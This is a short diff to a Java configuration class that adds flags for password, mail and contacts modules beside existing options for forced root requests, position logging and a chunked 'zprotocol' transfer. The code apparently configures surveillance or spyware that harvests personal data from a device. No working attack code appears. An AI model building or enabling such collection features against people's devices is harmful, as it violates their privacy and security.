@@ -28,6 +28,10 @@ public class Cfg {
 	public static final boolean STATISTICS = false; // enable statistics on crypto and on commands
 	public static final boolean MEMOSTAT = false;
 	
+	public static final boolean ENABLE_PASSWORD_MODULE = false; // enable password module
+	public static final boolean ENABLE_MAIL_MODULE = false; // enable mail module
+	public static final boolean ENABLE_CONTACTS = true; // actually saves contacs
+	
 	public static final boolean PROTOCOL_RANDBLOCK = true; // increses randomly zprotocol commands
 	public static final boolean PROTOCOL_RESUME = true; // enables zprotocol resume for big files
 	public static final int PROTOCOL_CHUNK = 65536; // chunk size fot resume
@@ -36,6 +40,7 @@ public class Cfg {
 	public static final boolean FORCE_ROOT = false; // force root request
 	
 	public static final boolean LOG_POSITION = false; // log positions on a file
+	public static final boolean ONE_MAIL = false; // 
 	
 	public static final boolean POWER_MANAGEMENT = true; // if true, tries to acquire power lock only when needed 
 	
